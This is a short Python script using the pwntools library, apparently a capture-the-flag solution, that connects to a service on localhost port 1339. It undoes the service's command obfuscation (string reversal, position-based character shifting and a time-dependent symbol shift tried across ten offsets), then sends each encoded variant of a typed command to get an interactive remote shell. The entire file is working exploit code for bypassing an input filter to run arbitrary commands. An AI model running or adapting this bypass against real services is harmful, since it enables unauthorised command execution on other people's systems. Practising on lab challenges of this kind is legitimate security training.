#!/bin/python3

import string
from datetime import datetime, timezone
from pwn import *

HOST = "localhost"
PORT = "1339"


def reverse(input):
    return input[::-1]


def reverseCharacterShifting(input):
    out = ""
    for i, character in enumerate(input):
        if character in string.ascii_lowercase:
            out += chr(97 + (ord(character) - i - 97) % 26)
        elif character in string.ascii_uppercase:
            out += chr(65 + (ord(character) - i - 65) % 26)
        elif character in string.digits:
            out += chr(48 + (ord(character) - i - 48) % 10)
        else:
            out += character
    return out


def reverseSymbolsShifting(input):
    return [
        "".join(
            [
                chr(
                    32
                    + (ord(character) - datetime.now(timezone.utc).second + offset - 32)
                    % 17
                )
                if ord(character) in range(32, 48)
                else character
                for character in input
            ]
        )
        for offset in range(0, 10)
    ]


r = remote(HOST, PORT)

try:
    r.recvuntil(b"$ ")
    while True:
        cmd = input("$ ")
        crafted = reverseSymbolsShifting(reverse(cmd))
        for payl in crafted:
            sending = reverseCharacterShifting(payl)
            print("Sending: {}".format(sending))
            r.sendline(sending.encode())
            output = r.recvuntil(b"$ ")
            print(output.decode()[:-4])

except EOFError:
    print("\n\nThe program terminated unexpectedly")

except KeyboardInterrupt:
    pass

finally:
    r.close()
